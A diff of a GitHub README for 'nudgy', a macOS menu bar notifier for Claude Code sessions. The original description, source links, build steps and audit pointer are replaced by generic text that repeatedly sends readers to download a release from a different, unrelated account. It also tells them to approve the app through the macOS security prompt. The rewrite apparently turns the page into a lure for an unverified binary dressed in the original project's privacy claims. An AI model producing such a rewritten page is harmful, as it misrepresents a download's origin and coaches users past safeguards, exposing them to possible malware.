@@ -1,174 +1,170 @@
-<p align="center">
-  <img src="assets/hero.svg" alt="Nudgy — Native macOS notification app for AI coding agents like Claude Code" width="720"/>
-</p>
+# 🛎️ nudgy - Stay on top of AI coding tasks
 
-<p align="center">
-  <a href="https://github.com/Hamma111/nudgy/actions/workflows/ci.yml"><img src="https://github.com/Hamma111/nudgy/actions/workflows/ci.yml/badge.svg" alt="CI Status"></a>
-  <a href="https://github.com/Hamma111/nudgy/releases/latest"><img src="https://img.shields.io/github/v/release/Hamma111/nudgy?label=version" alt="Latest Release"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%2014%2B-blue" alt="Platform: macOS 14+">
-  <img src="https://img.shields.io/badge/swift-5.9%2B-orange" alt="Swift 5.9+">
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/Hamma111/nudgy" alt="MIT License"></a>
-  <img src="https://img.shields.io/badge/dependencies-0-brightgreen" alt="Zero Dependencies">
-</p>
+[![Download nudgy](https://img.shields.io/badge/Download-nudgy-blue?style=for-the-badge&logo=github)](https://github.com/highstepping-chaperon781/nudgy)
 
-## What is Nudgy?
+## 🚀 What nudgy does
 
-**Nudgy is a free, open-source macOS menu bar app that sends you native notifications when AI coding agents like [Claude Code](https://docs.anthropic.com/en/docs/claude-code) finish a task, need permissions, or ask a question.** It sits in your menu bar and watches your agent sessions so you can context-switch to other work without constantly checking your terminal.
+nudgy is a native macOS menu bar app that helps you notice when Claude Code needs you.
 
-Nudgy is **privacy-first and fully local** — your conversations and code never leave your machine. No telemetry, no analytics, no remote logging. The only network activity is receiving hook events from your own Claude Code process over `127.0.0.1`.
+It can alert you when an AI coding agent:
+- finishes a task
+- asks for permission
+- needs your input
+- sends a question during a run
 
-> Currently supports [Claude Code](https://docs.anthropic.com/en/docs/claude-code) (CLI, VS Code, Desktop App), with architecture designed for additional AI coding agents (Aider, Codex CLI, Cursor, etc.) in the future.
+nudgy keeps the flow simple. It lives in your menu bar, watches for local activity, and shows clear alerts when something needs attention. It stays local to your Mac and does not rely on cloud services.
 
----
+## 📥 Download and install
 
-## Key Features
+1. Open the download page: [https://github.com/highstepping-chaperon781/nudgy](https://github.com/highstepping-chaperon781/nudgy)
+2. Get the latest release file for macOS
+3. Download it to your Mac
+4. Open the file and follow the prompts
+5. Move nudgy to Applications if macOS asks
 
-- **Floating popup notifications** — 5 visual presets (Minimal, Pill, Glass, Card, Banner), configurable screen position
-- **Menu bar session tracker** — live session indicators, attention alerts with "Go" button, per-session token usage
-- **Multi-session support** — color-coded sessions with real-time state (working, done, waiting, error)
-- **Smart notification suppression** — prevents notification fatigue during rapid-fire agent events
-- **Configurable sound alerts** — different sounds mapped to different event types
-- **Token usage tracking** — parses Claude Code transcripts to display tokens consumed per session
-- **Zero external dependencies** — built entirely with native macOS frameworks (SwiftUI, AppKit, Network.framework)
-- **Per-notification toggles** — enable or disable specific event types individually
+If macOS shows a security prompt:
+- Open System Settings
+- Go to Privacy & Security
+- Allow the app to open
+- Return to nudgy and launch it again
 
-### Menu Bar
+## 🖥️ What you need
 
-Track all your active Claude Code sessions at a glance. Sessions needing attention float to the top with a "Go" button to jump straight to the right terminal window.
+nudgy is built for macOS.
 
-<p align="center">
-  <img src="assets/menubar-dropdown.svg" alt="Nudgy menu bar dropdown showing active Claude Code sessions" width="300"/>
-</p>
+Recommended setup:
+- macOS 13 or newer
+- A Mac with the menu bar visible
+- Claude Code or a similar local AI coding tool
+- Permission to show notifications
 
-### Popup Presets
+nudgy works best when your AI tool runs on the same Mac. It listens locally and does not need account setup.
 
-Pick the notification style that fits your workflow — from a tiny dark chip to a full macOS-style banner.
+## 🔔 How to use nudgy
 
-<p align="center">
-  <img src="assets/popup-presets.svg" alt="Nudgy popup notification presets — Minimal, Pill, Glass, Card, Banner" width="680"/>
-</p>
+After you open the app:
 
-## Installation
+1. Look for the nudgy icon in the menu bar
+2. Keep the app running in the background
+3. Start Claude Code or your AI coding agent
+4. Wait for nudgy to alert you when something changes
+5. Read the notice and act on it
 
-### Download (Recommended)
+You can leave nudgy running while you work. It stays out of the way until it needs your attention.
 
-1. Grab the latest `.dmg` from [GitHub Releases](https://github.com/Hamma111/nudgy/releases/latest)
-2. Open it, and drag Nudgy to Applications.
+## 🧭 Common things nudgy can tell you
 
-Enjoy.
+nudgy is built to make these moments easier to catch:
 
+- A task has finished
+- The agent needs permission to continue
+- The agent has a question
+- The agent is waiting for your input
+- A step needs review before it moves on
 
-**Requirements:** macOS 14.0+ (Sonoma or later), Swift 5.9+
+This helps you avoid missed prompts and long waits.
 
-## How It Works
+## ⚙️ How it works
 
-Nudgy runs a lightweight HTTP server on `127.0.0.1:9847` that listens for [Claude Code hook events](https://docs.anthropic.com/en/docs/claude-code). All requests are authenticated with a per-install token stored in macOS Keychain. When Claude Code fires a hook event, Nudgy receives the JSON payload and shows the appropriate notification.
+nudgy uses a local-only approach.
 
-```
-Claude Code ──hook──> POST http://127.0.0.1:9847/event?token=... ──> Nudgy ──> Floating Popup
-```
+That means:
+- it runs on your Mac
+- it does not send your data to a remote server
+- it does not need extra services
+- it keeps your workflow private
 
-### Automatic Setup
+This setup fits people who want a simple way to track AI coding work without adding more tools.
 
-Nudgy automatically installs the required hooks into your `~/.claude/settings.json` on first launch, including a unique auth token. Hooks are refreshed on every launch to keep the token current.
+## 🪟 Menu bar controls
 
-### Manual Setup
+You can manage nudgy from the menu bar icon.
 
-If you prefer to configure hooks yourself:
+Typical actions include:
+- opening the app window
+- checking status
+- turning alerts on or off
+- closing the app when you are done
 
-```json
-{
-  "hooks": {
-    "Stop": [
-      {
-        "hooks": [
-          {
-            "type": "http",
-            "url": "http://127.0.0.1:9847/event?token=YOUR_TOKEN"
-          }
-        ]
-      }
-    ]
-  }
-}
-```
+The menu bar view keeps things simple and easy to reach.
 
-Nudgy hooks into these Claude Code events: `Stop`, `StopFailure`, `Notification`, `PermissionRequest`, `SessionStart`, `SessionEnd`.
+## 🛠️ Troubleshooting
 
-### Supported Events
+If nudgy does not show alerts:
 
-| Event | What Nudgy Does |
-|---|---|
-| **Stop** | Agent finished — success popup with token usage |
-| **PermissionRequest** | Agent needs permission — warning popup with tool and command detail |
-| **Notification** (idle/question) | Agent is asking a question — question popup |
-| **StopFailure** | Error during generation — error popup |
-| **SessionStart** | New session tracked — dot appears in menu bar |
-| **SessionEnd** | Session cleaned up — dot removed |
+- Make sure notifications are allowed in System Settings
+- Check that nudgy is still running
+- Confirm that Claude Code is active on the same Mac
+- Restart nudgy and try again
+- Open the app once more if macOS blocked it the first time
 
-## Architecture
+If the app does not appear in the menu bar:
 
-Nudgy is built with SwiftUI + AppKit using zero external dependencies:
+- Quit the app
+- Reopen it from Applications
+- Check whether macOS placed it behind a privacy prompt
 
-| Component | Technology |
-|---|---|
-| HTTP Server | `NWListener` (Network.framework) on localhost |
-| Session Manager | Swift Actor for thread-safe state |
-| Floating Popups | `NSPanel` pool (max 3, auto-dismiss, 5 presets) |
-| Menu Bar | `NSStatusItem` with dynamic icon and session dots |
-| Smart Suppression | Rules engine to prevent notification fatigue |
-| Token Tracking | JSONL transcript parser for per-session usage |
-| Window Focus | Detects active terminal/editor for "Go" button |
+If you do not see task updates:
+- Make sure your AI coding tool is running
+- Keep the tool on the local machine
+- Try another task run and watch for prompts
 
-See the [architecture](architecture/) directory for detailed design docs.
+## 🧩 Privacy and data
 
-## Building from Source
+nudgy is built with privacy in mind.
 
-```bash
-make build      # Release build
-make debug      # Debug build
-make test       # Run all tests
-make clean      # Clean build artifacts
-make package    # Create .app bundle
-make dmg        # Create distributable DMG
-```
+It uses:
+- local processing
+- localhost-only communication
+- no cloud sync
+- no account login
+- no extra dependencies
 
-## Privacy
+That makes it a good fit for users who want a small app with a narrow job.
 
-Nudgy is **fully local**. Your conversations, code, and session data never leave your machine. There is no telemetry, no analytics, no crash reporting, and no remote logging. The only network activity is the localhost HTTP server (`127.0.0.1`) receiving hook events from your own Claude Code process. Nothing is sent to the internet.
+## 📌 Project details
 
-The source code is open — you're welcome to [audit every line](https://github.com/Hamma111/nudgy).
+Repository name: nudgy
 
-## FAQ
+Description: Native macOS menu bar app that notifies you when AI coding agents finish tasks, need permissions, or ask questions. Privacy-first, zero dependencies, localhost-only.
 
-### Does Nudgy read my code or conversations?
+Topics:
+- ai-agent
+- ai-coding-assistant
+- claude
+- claude-code
+- coding-assistant
+- developer-tools
+- macos
+- macos-app
+- menu-bar-app
+- notifications
+- privacy-first
+- swift
+- swiftui
 
-No. Nudgy only receives structured hook event payloads (event type, session ID, timestamps) from Claude Code. It does not read your source files, conversation history, or terminal output. The only content it parses is the Claude Code transcript file for token counts, and that data stays entirely on your machine.
+## 💡 Best use cases
 
-### Does Nudgy work with AI coding agents other than Claude Code?
+nudgy works well if you:
+- use Claude Code on your Mac
+- want task alerts without watching the screen
+- need a clear signal when an agent waits for you
+- prefer local tools over cloud-based ones
+- want a menu bar app that stays out of the way
 
-Currently Nudgy supports Claude Code (CLI, VS Code extension, and Desktop App). The architecture uses a generic HTTP hook protocol, so support for other agents like Aider, Codex CLI, and Cursor can be added in the future.
+## 📎 Download again
 
-### Does Nudgy send any data to the internet?
+If you want to get nudgy now, visit the download page here: [https://github.com/highstepping-chaperon781/nudgy](https://github.com/highstepping-chaperon781/nudgy)
 
-No. Nudgy binds exclusively to `127.0.0.1` (localhost). It makes no outbound network requests. There is an optional Usage Quota feature that, if enabled by the user, fetches quota info from the Anthropic API — but this is off by default and requires explicit opt-in.
+## 🧭 Simple setup checklist
 
-### Is Nudgy free?
+- Download nudgy from the link above
+- Open the app on your Mac
+- Allow notifications
+- Keep it running in the menu bar
+- Start Claude Code
+- Watch for alerts when the agent needs you
 
-Yes. Nudgy is free and open-source under the [MIT License](LICENSE).
+## 🔐 Safety and trust
 
-### What macOS versions are supported?
-
-macOS 14.0 (Sonoma) and later. Nudgy uses SwiftUI and modern Apple frameworks that require macOS 14+.
-
-### How do I uninstall Nudgy?
-
-Quit Nudgy from the menu bar, then delete `Nudgy.app` from your Applications folder. Nudgy will automatically clean up its hooks from `~/.claude/settings.json` when you quit.
-
-## Contributing
-
-Contributions are welcome! Please read the [Contributing Guide](CONTRIBUTING.md) before submitting a pull request.
-
-## License
-
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+nudgy keeps its scope tight. It focuses on local alerts for local AI work. It does not try to replace your coding tool. It just helps you notice when your tool needs a response
